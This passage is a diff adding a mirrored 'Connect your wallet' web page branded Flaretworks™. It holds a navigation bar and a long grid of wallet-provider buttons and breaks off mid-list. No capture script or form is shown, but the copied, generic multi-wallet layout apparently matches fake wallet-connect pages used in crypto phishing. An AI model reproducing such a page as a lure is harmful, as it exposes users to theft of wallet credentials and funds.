@@ -1,0 +1,1913 @@
+<!doctype html>
+<html lang="en">
+
+
+<!-- Mirrored from layerchain.in/connect.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 29 Mar 2025 07:22:43 GMT -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" type="image/png" href="assets/img/favicon.png">
+    <title>Flaretworks™</title>
+
+    <base />
+
+    <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link href="assets/vendor/icons/icofont.min.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="assets/vendor/bootstrap/font/bootstrap-icons.css">
+    <link rel="stylesheet" type="text/css" href="assets/vendor/slick/slick.min.css" />
+    <link rel="stylesheet" type="text/css" href="assets/vendor/slick/slick-theme.min.css" />
+    <link href="assets/css/style.css" rel="stylesheet">
+    <!-- jQuery UI for draggable -->
+    <link rel="stylesheet" href="https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
+</head>
+
+<body>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark shadow-sm p-0 osahan-nav">
+        <div class="container">
+            <a class="navbar-brand" href="index-2.html">
+                <img src="assets/img/dapp_logo.png" alt="#" class="img-fluid">
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavAltMarkup16" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNavAltMarkup16">
+                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+                    <li class="nav-item">
+                        <a class="nav-link active" aria-current="page" href="index-2.html">Home - Flaretworks™</a>
+                    </li>
+                </ul>
+                <ul class="nav explore-tabs mb-0 justify-content-center gap-2" id="chain-switch-pill" role="tablist">
+                    <li class="nav-item" role="presentation" data-chain-id="1">
+                        <button class="nav-link " id="pills-ethereum-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-ethereum" aria-selected="true">
+                            <a style="text-decoration:none" href="https://ethereum.org/en/">
+                                <span><img src="assets/img/ethereum.png" width="8"></span> Ethereum
+                            </a>
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation" data-chain-id="2">
+                        <button class="nav-link " id="pills-bsc-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-bsc" aria-selected="true">
+                            <a style="text-decoration:none" href="https://bscscan.com/">
+                                <span><img src="assets/img/binance.png" width="15"></span> BSC
+                            </a>
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation" data-chain-id="3">
+                        <button class="nav-link " id="pills-polygon-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-polygon" aria-selected="true">
+                            <a style="text-decoration:none" href="https://polygon.technology/">
+                                <span><img src="assets/img/polygon.png" width="15"></span> Polygon
+                            </a>
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation" data-chain-id="4">
+                        <button class="nav-link " id="pills-avalanche-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-avalanche" aria-selected="true">
+                            <a style="text-decoration:none" href="https://www.avax.network/">
+                                <span><img src="assets/img/avalanche.png" width="15"></span> Avalanche
+                            </a>
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation" data-chain-id="5">
+                        <button class="nav-link " id="pills-solana-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-solana" aria-selected="true">
+                            <a style="text-decoration:none" href="https://solana.com/">
+                                <span><img src="assets/img/solana.png" width="15"></span> Solana
+                            </a>
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation" data-chain-id="6">
+                        <button class="nav-link " id="pills-cardano-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-cardano" aria-selected="true">
+                            <a style="text-decoration:none" href="https://cardano.org/">
+                                <span><img src="assets/img/cardano.png" width="15"></span> Cardano
+                            </a>
+                        </button>
+                    </li>
+                </ul>
+                <div class="navbar-nav ms-auto gap-3 connect_wallet">
+                    <a class="btn btn-primary btn-sm" href="connect.html"><i class="bi bi-wallet"></i> Connect
+                        Wallet</a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <section class="pt-5 bg-dark">
+        <div class="container py-4 px-5 text-center">
+            <div class="row gx-5 justify-content-center">
+                <div class="col-lg-8">
+                    <h1 class="text-white display-5 mb-2 fw-bold">Connect your wallet</h1>
+                    <p class="lead text-white-50 m-0">Sign in with one of these available wallet providers<br> or create a new wallet.
+                    </p>
+                </div>
+            </div>
+        </div>
+        <div class="svg-border-rounded text-light">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 144.54 17.34" preserveAspectRatio="none"
+                fill="#f0f2f5">
+                <path d="M144.54,17.34H0V0H144.54ZM0,0S32.36,17.34,72.27,17.34,144.54,0,144.54,0"></path>
+            </svg>
+        </div>
+    </section>
+
+    <section class="py-5">
+        <div class="container py-4">
+            <div class="row justify-content-center">
+                <div class="col-12 col-lg-9">
+                    <ul class="nav help-tabs mb-3 justify-content-center" id="pills-tab" role="tablist">
+                        <!-- Metamask -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-metamask-tab" data-bs-toggle="pill" data-bs-target="#pills-metamask" data-payment-protocol="0" data-wallet-name="Metamask" data-wallet-logo="assets/img/wallets/metamask.png" type="button" role="tab" aria-controls="pills-metamask" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/metamask.png" width="50"></span>
+                <span class="h6 fw-bold">Metamask</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Trust Wallet -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-trust_wallet-tab" data-bs-toggle="pill" data-bs-target="#pills-trust_wallet" data-payment-protocol="1" data-wallet-name="Trust Wallet" data-wallet-logo="assets/img/wallets/trust_wallet.png" type="button" role="tab" aria-controls="pills-trust_wallet" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/trust_wallet.png" width="50"></span>
+                <span class="h6 fw-bold">Trust</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Coinbase -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-coinbase-tab" data-bs-toggle="pill" data-bs-target="#pills-coinbase" data-payment-protocol="2" data-wallet-name="Coinbase" data-wallet-logo="assets/img/wallets/coinbase.png" type="button" role="tab" aria-controls="pills-coinbase" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/coinbase.png" width="50"></span>
+                <span class="h6 fw-bold">Coinbase</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Ledger -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Ledger-tab" data-bs-toggle="pill" data-bs-target="#pills-ledgerlive" data-payment-protocol="3" data-wallet-name="Ledger" data-wallet-logo="assets/img/wallets/ledgerlive.png" type="button" role="tab" aria-controls="pills-ledgerlive" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/ledgerlive.png" width="50"></span>
+                <span class="h6 fw-bold">Ledger</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Trezor -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Trezor-tab" data-bs-toggle="pill" data-bs-target="#pills-Trezor" data-payment-protocol="4" data-wallet-name="Trezor" data-wallet-logo="assets/img/wallets/Trezor.jfif" type="button" role="tab" aria-controls="pills-Trezor" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/Trezor.jfif" width="50"></span>
+                <span class="h6 fw-bold">Trezor</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Aave -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Aave-tab" data-bs-toggle="pill" data-bs-target="#pills-Aave" data-payment-protocol="5" data-wallet-name="Aave" data-wallet-logo="assets/img/wallets/aave.png" type="button" role="tab" aria-controls="pills-Aave" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/aave.png" width="50"></span>
+                <span class="h6 fw-bold">Aave</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Ambire -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Ambire-tab" data-bs-toggle="pill" data-bs-target="#pills-Ambire" data-payment-protocol="6" data-wallet-name="Ambire" data-wallet-logo="assets/img/wallets/ambire.jfif" type="button" role="tab" aria-controls="pills-Ambire" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/ambire.jfif" width="50"></span>
+                <span class="h6 fw-bold">Ambire</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- ArConnect -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-ArConnect-tab" data-bs-toggle="pill" data-bs-target="#pills-ArConnect" data-payment-protocol="7" data-wallet-name="ArConnect" data-wallet-logo="assets/img/wallets/arconnect.png" type="button" role="tab" aria-controls="pills-ArConnect" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/arconnect.png" width="50"></span>
+                <span class="h6 fw-bold">ArConnect</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Arculus -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Arculus-tab" data-bs-toggle="pill" data-bs-target="#pills-Arculus" data-payment-protocol="8" data-wallet-name="Arculus" data-wallet-logo="assets/img/wallets/arculus.jfif" type="button" role="tab" aria-controls="pills-Arculus" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/arculus.jfif" width="50"></span>
+                <span class="h6 fw-bold">Arculus</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Argent -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Argent-tab" data-bs-toggle="pill" data-bs-target="#pills-Argent" data-payment-protocol="9" data-wallet-name="Argent" data-wallet-logo="assets/img/wallets/argent.jfif" type="button" role="tab" aria-controls="pills-Argent" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/argent.jfif" width="50"></span>
+                <span class="h6 fw-bold">Argent</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Atomic -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Atomic-tab" data-bs-toggle="pill" data-bs-target="#pills-Atomic" data-payment-protocol="10" data-wallet-name="Atomic" data-wallet-logo="assets/img/wallets/atomic.jfif" type="button" role="tab" aria-controls="pills-Atomic" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/atomic.jfif" width="50"></span>
+                <span class="h6 fw-bold">Atomic</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Binance -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Binance-tab" data-bs-toggle="pill" data-bs-target="#pills-Binance" data-payment-protocol="11" data-wallet-name="Binance" data-wallet-logo="assets/img/wallets/binance.jfif" type="button" role="tab" aria-controls="pills-Binance" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/binance.jfif" width="50"></span>
+                <span class="h6 fw-bold">Binance</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Bitcoin -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Bitcoin-tab" data-bs-toggle="pill" data-bs-target="#pills-Bitcoin" data-payment-protocol="12" data-wallet-name="Bitcoin" data-wallet-logo="assets/img/wallets/Bitcoin.jfif" type="button" role="tab" aria-controls="pills-Bitcoin" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/Bitcoin.jfif" width="50"></span>
+                <span class="h6 fw-bold">Bitcoin</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- BitBox -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-BitBox-tab" data-bs-toggle="pill" data-bs-target="#pills-BitBox" data-payment-protocol="13" data-wallet-name="Bitbox" data-wallet-logo="assets/img/wallets/bitbox.jfif" type="button" role="tab" aria-controls="pills-BitBox" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/bitbox.jfif" width="50"></span>
+                <span class="h6 fw-bold">BitBox</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- BitGet -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-BitGet-tab" data-bs-toggle="pill" data-bs-target="#pills-BitGet" data-payment-protocol="14" data-wallet-name="Bitget" data-wallet-logo="assets/img/wallets/Bitget.jfif" type="button" role="tab" aria-controls="pills-BitGet" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/Bitget.jfif" width="50"></span>
+                <span class="h6 fw-bold">BitGet</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- BitPay -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-BitPay-tab" data-bs-toggle="pill" data-bs-target="#pills-BitPay" data-payment-protocol="15" data-wallet-name="BitPay" data-wallet-logo="assets/img/wallets/bitpay.jfif" type="button" role="tab" aria-controls="pills-BitPay" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/bitpay.jfif" width="50"></span>
+                <span class="h6 fw-bold">BitPay</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Blade -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-blade-tab" data-bs-toggle="pill" data-bs-target="#pills-blade" data-payment-protocol="16" data-wallet-name="Blade" data-wallet-logo="assets/img/wallets/blade.png" type="button" role="tab" aria-controls="pills-blade" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/blade.png" width="50"></span>
+                <span class="h6 fw-bold">Blade</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Blue Wallet -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-BlueWallet-tab" data-bs-toggle="pill" data-bs-target="#pills-BlueWallet" data-payment-protocol="17" data-wallet-name="Blue Wallet" data-wallet-logo="assets/img/wallets/blue.jfif" type="button" role="tab" aria-controls="pills-BlueWallet" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/blue.jfif" width="50"></span>
+                <span class="h6 fw-bold">Blue Wallet</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- BRD -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-BRD-tab" data-bs-toggle="pill" data-bs-target="#pills-BRD" data-payment-protocol="18" data-wallet-name="BRD" data-wallet-logo="assets/img/wallets/brd.jfif" type="button" role="tab" aria-controls="pills-BRD" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/brd.jfif" width="50"></span>
+                <span class="h6 fw-bold">BRD</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Cake Wallet -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-CakeWallet-tab" data-bs-toggle="pill" data-bs-target="#pills-CakeWallet" data-payment-protocol="19" data-wallet-name="Cake Wallet" data-wallet-logo="assets/img/wallets/cake.jfif" type="button" role="tab" aria-controls="pills-CakeWallet" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/cake.jfif" width="50"></span>
+                <span class="h6 fw-bold">Cake Wallet</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Ckbull -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Ckbull-tab" data-bs-toggle="pill" data-bs-target="#pills-Ckbull" data-payment-protocol="20" data-wallet-name="Ckbull" data-wallet-logo="assets/img/wallets/ckbull.jfif" type="button" role="tab" aria-controls="pills-Ckbull" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/ckbull.jfif" width="50"></span>
+                <span class="h6 fw-bold">Ckbull</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Coin Wallet -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-coin-tab" data-bs-toggle="pill" data-bs-target="#pills-coin" data-payment-protocol="21" data-wallet-name="Coin Wallet" data-wallet-logo="assets/img/wallets/coin.png" type="button" role="tab" aria-controls="pills-coin" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/coin.png" width="50"></span>
+                <span class="h6 fw-bold">Coin Wallet</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Coinjar -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Coinjar-tab" data-bs-toggle="pill" data-bs-target="#pills-Coinjar" data-payment-protocol="22" data-wallet-name="Coinjar" data-wallet-logo="assets/img/wallets/coinjar.jfif" type="button" role="tab" aria-controls="pills-Coinjar" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/coinjar.jfif" width="50"></span>
+                <span class="h6 fw-bold">Coinjar</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Coinomi -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Coinomi-tab" data-bs-toggle="pill" data-bs-target="#pills-Coinomi" data-payment-protocol="23" data-wallet-name="Coinomi" data-wallet-logo="assets/img/wallets/coinomi.jfif" type="button" role="tab" aria-controls="pills-Coinomi" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/coinomi.jfif" width="50"></span>
+                <span class="h6 fw-bold">Coinomi</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Coinspace -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Coinspace-tab" data-bs-toggle="pill" data-bs-target="#pills-Coinspace" data-payment-protocol="24" data-wallet-name="Coinspace" data-wallet-logo="assets/img/wallets/coinspace.jfif" type="button" role="tab" aria-controls="pills-Coinspace" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/coinspace.jfif" width="50"></span>
+                <span class="h6 fw-bold">Coinspace</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Coldcard -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Coldcard-tab" data-bs-toggle="pill" data-bs-target="#pills-Coldcard" data-payment-protocol="25" data-wallet-name="Coldcard" data-wallet-logo="assets/img/wallets/coldcard.jfif" type="button" role="tab" aria-controls="pills-Coldcard" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/coldcard.jfif" width="50"></span>
+                <span class="h6 fw-bold">Coldcard</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Cool Wallet -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-CoolWallet-tab" data-bs-toggle="pill" data-bs-target="#pills-CoolWallet" data-payment-protocol="26" data-wallet-name="Cool Wallet" data-wallet-logo="assets/img/wallets/cool.jfif" type="button" role="tab" aria-controls="pills-CoolWallet" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/cool.jfif" width="50"></span>
+                <span class="h6 fw-bold">Cool Wallet</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Core -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Core-tab" data-bs-toggle="pill" data-bs-target="#pills-Core" data-payment-protocol="27" data-wallet-name="Core" data-wallet-logo="assets/img/wallets/core.png" type="button" role="tab" aria-controls="pills-Core" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/core.png" width="50"></span>
+                <span class="h6 fw-bold">Core</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Crypto Defi -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-CryptoDefi-tab" data-bs-toggle="pill" data-bs-target="#pills-CryptoDefi" data-payment-protocol="28" data-wallet-name="Crypto Defi" data-wallet-logo="assets/img/wallets/crypto defi.jfif" type="button" role="tab" aria-controls="pills-CryptoDefi" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/crypto%20defi.jfif" width="50"></span>
+                <span class="h6 fw-bold">Crypto Defi</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Cwallet -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Cwallet-tab" data-bs-toggle="pill" data-bs-target="#pills-Cwallet" data-payment-protocol="29" data-wallet-name="Cwallet" data-wallet-logo="assets/img/wallets/cwallet.png" type="button" role="tab" aria-controls="pills-Cwallet" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/cwallet.png" width="50"></span>
+                <span class="h6 fw-bold">Cwallet</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- D'Cent -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-DCent-tab" data-bs-toggle="pill" data-bs-target="#pills-DCent" data-payment-protocol="30" data-wallet-name="D'Cent" data-wallet-logo="assets/img/wallets/dcent.png" type="button" role="tab" aria-controls="pills-DCent" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/dcent.png" width="50"></span>
+                <span class="h6 fw-bold">D'Cent</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Electrum -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Electrum-tab" data-bs-toggle="pill" data-bs-target="#pills-Electrum" data-payment-protocol="31" data-wallet-name="Electrum" data-wallet-logo="assets/img/wallets/electrum.jfif" type="button" role="tab" aria-controls="pills-Electrum" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/electrum.jfif" width="50"></span>
+                <span class="h6 fw-bold">Electrum</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Ellipal -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Ellipal-tab" data-bs-toggle="pill" data-bs-target="#pills-Ellipal" data-payment-protocol="32" data-wallet-name="Ellipal" data-wallet-logo="assets/img/wallets/ellipal.jpg" type="button" role="tab" aria-controls="pills-Ellipal" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/ellipal.jpg" width="50"></span>
+                <span class="h6 fw-bold">Ellipal</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Enjin -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Enjin-tab" data-bs-toggle="pill" data-bs-target="#pills-Enjin" data-payment-protocol="33" data-wallet-name="Enjin" data-wallet-logo="assets/img/wallets/enjin.jfif" type="button" role="tab" aria-controls="pills-Enjin" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/enjin.jfif" width="50"></span>
+                <span class="h6 fw-bold">Enjin</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Exodus -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-exodus-tab" data-bs-toggle="pill" data-bs-target="#pills-exodus" data-payment-protocol="34" data-wallet-name="Exodus" data-wallet-logo="assets/img/wallets/exodus.png" type="button" role="tab" aria-controls="pills-exodus" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/exodus.png" width="50"></span>
+                <span class="h6 fw-bold">Exodus</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Fearless -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Fearless-tab" data-bs-toggle="pill" data-bs-target="#pills-Fearless" data-payment-protocol="35" data-wallet-name="Fearless" data-wallet-logo="assets/img/wallets/fearless.jfif" type="button" role="tab" aria-controls="pills-Fearless" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/fearless.jfif" width="50"></span>
+                <span class="h6 fw-bold">Fearless</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Frontier -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Frontier-tab" data-bs-toggle="pill" data-bs-target="#pills-Frontier" data-payment-protocol="36" data-wallet-name="Frontier" data-wallet-logo="assets/img/wallets/frontier.jfif" type="button" role="tab" aria-controls="pills-Frontier" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/frontier.jfif" width="50"></span>
+                <span class="h6 fw-bold">Frontier Wallet</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Green Address -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-GreenAddress-tab" data-bs-toggle="pill" data-bs-target="#pills-GreenAddress" data-payment-protocol="37" data-wallet-name="Green Address" data-wallet-logo="assets/img/wallets/green address.jfif" type="button" role="tab" aria-controls="pills-GreenAddress" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/green%20address.jfif" width="50"></span>
+                <span class="h6 fw-bold">Green Address</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Guarda -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-Guarda-tab" data-bs-toggle="pill" data-bs-target="#pills-Guarda" data-payment-protocol="38" data-wallet-name="Guarda" data-wallet-logo="assets/img/wallets/guarda.jfif" type="button" role="tab" aria-controls="pills-Guarda" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/guarda.jfif" width="50"></span>
+                <span class="h6 fw-bold">Guarda</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- HashPack -->
+                        <li class="nav-item" role="presentation">
+                            <button class="payment_protocol_button nav-link shadow-sm" id="pills-HashPack-tab" data-bs-toggle="pill" data-bs-target="#pills-HashPack" data-payment-protocol="39" data-wallet-name="HashPack" data-wallet-logo="assets/img/wallets/hashpack.jfif" type="button" role="tab" aria-controls="pills-HashPack" aria-selected="true">
+            <span class="text-center px-0 px-md-3 d-flex align-items-center flex-column">
+                <span class="mb-2"><img class=" " src="assets/img/wallets/hashpack.jfif" width="50"></span>
+                <span class="h6 fw-bold">HashPack</span>
+            </span>
+        </button>
+                        </li>
+
+                        <!-- Helium -->
+                        <li class="nav-item" role="presentation">
